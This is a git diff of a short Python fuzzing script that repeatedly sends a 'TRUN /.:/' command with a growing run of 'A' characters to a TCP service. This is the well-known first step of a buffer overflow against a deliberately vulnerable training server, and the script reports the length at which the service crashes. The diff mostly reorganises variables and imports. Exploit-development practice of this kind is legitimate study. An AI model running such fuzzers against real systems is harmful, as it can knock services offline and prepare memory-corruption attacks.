@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 
-import sys, socket
+import socket
+from sys import exit
 from time import sleep
 
 class bcolors:
@@ -14,6 +15,13 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+buffer_len = 100 # change this
+host = "127.0.0.1" # change this
+port = 9999 # change this
+
+buffer = "A" * buffer_len
+target = (host, port)
+
 print(f"""{bcolors.BLUE} {bcolors.BOLD}
                     ____
    ____  _____     / __/_  __________
@@ -23,22 +31,16 @@ print(f"""{bcolors.BLUE} {bcolors.BOLD}
           /_____/ {bcolors.GREEN}{bcolors.UNDERLINE}by abdellatif-dev
 {bcolors.ENDC}""")
 
-
-buffer_len = 1 # change this
-buffer = "A" * buffer_len
-target = ('127.0.0.1',9999) # change this
-
 while True:
     try:
         payload = "TRUN /.:/" + buffer
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(target)
-        print (f"{bcolors.BLUE}{bcolors.BOLD}[+] {bcolors.GREEN}Sending the payload...\n{bcolors.FAIL} {str(len(buffer))}")
+        print(f"{bcolors.BLUE}{bcolors.BOLD}[+] {bcolors.GREEN}Sending the payload...\n{bcolors.FAIL} {str(len(buffer))}")
         s.send((payload.encode()))
         s.close()
         sleep(1)
         buffer = buffer + "A"* buffer_len
     except:
-        print (f"{bcolors.GREEN}{bcolors.BOLD}The fuzzing crashed at{bcolors.FAIL} {str(len(buffer))} bytes{bcolors.ENDC}" )
-        sys.exit()
+        exit(f"{bcolors.GREEN}{bcolors.BOLD}The fuzzing crashed at{bcolors.FAIL} {str(len(buffer))} bytes{bcolors.ENDC}" )
